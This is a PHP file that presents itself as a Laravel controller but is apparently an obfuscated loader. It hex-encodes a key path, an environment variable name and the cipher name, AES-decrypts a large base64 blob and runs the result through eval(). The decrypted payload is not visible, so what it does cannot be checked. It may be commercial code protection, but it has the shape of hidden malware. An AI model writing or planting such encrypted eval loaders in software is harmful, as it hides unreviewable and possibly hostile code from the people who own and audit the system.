<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('hURuFxQU13g1yfJAOcN+xw==');

$c=base64_decode(

'9OT3BtpehMdIqFn2cbsMmvjQeRBVZxmz5xms7LgRhU8WtUuvccask7ZlPslYt9Ha3r0fqGRYRLUr' .
'qLE5o+dDPZg6SawJbewabpOr9TewZ8DNnrxF/NJDj9TMrlgkdk7NQtzo2Geejur3UtoWaXMCMBI2' .
'OcoCya+dKuJb+qiCGW+hFtyKHT7aai45h2U8XeIZmkgG1fAZ7rvUZXxzlLmCp6AzikHS1UTp4obF' .
'QCFxI0da44DEeWGNI6hg1hdXK8dTVP1+NOxH+nR0uZbHdc+feUXcMqfQxO2qdYC1xRQ+Qehx0dUx' .
'1JojypAghExs8V4/F1h+7l6e9zP9z7gk7fej+73lDCdv8zUchhT+3vLtFB8IjFF2tng0AQdjEEn2' .
'YitGeMNpetoo3JkPsQIQDbaMBgAlO2Lx+3V87yNT2I4pSDdAut+eo6PGMQ7X5DhoLaNnmJek9iTQ' .
'jYmYGVCrEbcj45HSbe7xBV7kyvwnNyYbqoePvGR5xITf1eHHePA6UoD/H1v+Gi35TrYo8xGYxb1N' .
'U0YcuVhw29bvAkoKfPFF3vR1jqWTes4HDjiXrVtaZqoI8ZmVrLgSYiLsoTS9IG/7NS+myY79KrNa' .
'Dd2C85t8OLmhgAcj7MCAkk99afX7QQSDj75Hh8ZEC1nz4k3A9jNTCxyZzUw+imHcxsEnDffR390F' .
'/kJspzcfA3vuNEEXvjUj1UuyrJH4MSY3HcnMus71dFeFtbyqRwEkRt8s+If1iK9qcuRQpCG9VnL5' .
'DTXID3mCF9ibTLC3mpPPfkjJgWfsdtDI5b4QCxvERlqOEVCFaBm4Xl/mywLnwlkTfyQnRebsPQfm' .
'grHWhGOgwusCHQMbEsa89XijY69kiZ4BQeYlMKIQrP+YAuTiWk3ChesIFpqen4SDPiAzm3KQr9DC' .
'90htsbWR9vmE84FLUN0QbAqss4SHvUO6MfWxJ+b+Uf4wp39YMv5Jl+EsBTDpWvjnYVUJJN5DCPDd' .
'Npi07sOtpHUSpaHQKrCiko/2MAW1AWynytyl1ZdtD8G/JI2PLvp4qW4XKGPmSrermFO9b9iWflQh' .
'hihpD9pdIPcwLeAxEfmLR074EdWb3FET9yju53IWLKKh4LjMQVOkwLmihXuLdNvs/kEZX5KQ0Gyw' .
'IUVvqC3a83ag3fey8eJJHEqC05gK/gBR/EHFmM/ju497c6tXlN+keqVBzus2IeHKPla86Ny8QMq2' .
'NZ29nEf2ygqUMy4hbLIRiTQPzH034+27kEfRQajOD06DgshQ+ueC3QIzwaYYRBPnh5iiDdoIJWPq' .
'vNR6vhJhETKtEYnkii/HLE0F8a2+K/GVa36M+f15iJgFO94IZgdJlVcH/GscWKeveEOIb0Yv9vl0' .
'CJUiudZ8U8cIs5369VNvjaj78hd6C8hs/5d9lSfN2qJ5P6oCfZWxk/G1tyerB0MNg4IHhcwsOP0i' .
'CZYUeF4A/5DzDRjFT5DF38F9jzDxvV9aF2ratnU2uDkhK4E60Ip1b3K3yj56g0SYJTNOsOWiGMSm' .
'v5T6czbZ/k4+CxYzBbZeuJxfRP/sFaVxCaqmCNzAa3w8Qzh58+NkD3nUP7tNms4gYGZP6x5ngU3Q' .
'2KrB/0YCLxJTwmqcpXPRhl09rtosNQlXDOH/kBaAq5jD5MzyJF1mSuLjC88pnEatWkJx6V4rtL00' .
'bmjNRojuRDhSaEps91UaUwwVfrWXVPsmzfFBLEn7xLhVN5HJqenhMvnaj8BTYZrwSe0g52Z2WJmb' .
'rVTAeKgzA4GAjvGqCTzpcdpbV/ippObtM9v0Vpz0f+C4TyrjOOWw5ltKhN3XemJqg+D4BNOikIpY' .
'U8wv95o8EQvcv2trXEshDasafIT9Tzlvxnh4BNVrMeMVMVxTh+K4lWwRXkug4cNuUC4Ba8z+gekn' .
'RgBOBzy+bCJa3+AlcnDKu/YDpRV9+PHWeDaMiB67W5CMBDWzVdm5pGvCHCLSA2R3W46V4UqBGs14' .
'GBmRrD774dvX05wZ1lKgbxTupg1phjEg+AggWcr2oJFOaDZ9HGSy5I8O99EYrlwVuE/aQVSTztqt' .
'KCbVLnNJwDnP9+WwyexwLY/PLX7K6SBECrdg+lOYgEBuHTK5B/7FBNzZeBk2YgLtg6PmPnOXCA1n' .
'uvj2InRXf/avdgsyfqDasQYAjyPN+VaUrcC10UrHeCaS0EynV3WLNmYUJBoMJ8z1gue34+/r+BCG' .
'saWezUu23440hv6F4Ci4xGSTUQS4T9src48t1ixwLNMa0eCmV+SGk6aRbZDl73gjGwLcD7t6IUxR' .
'Lok1Cpjc2Y1TdMCFi+gs4OftYCAiWk+fB2BkhcigIilWTbhbR6IQPC3iU5mYY4ZgFN54uDmFN1c0' .
'XO2KgBryUmNXAfT57j6fAH0KYsaS/u8KfWhHvkyN8a5+wt9BzvDvV+RU8NALW9nv00URU2jOncmK' .
'3ecGwoVAiplv/H/lsoWaWgW5E4kUrjG3UNXR1V9YlVkd4vBb89/Bfu1/g/ue89sjIoJ8WMyicldY' .
'VLhYY2qJ1Q=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

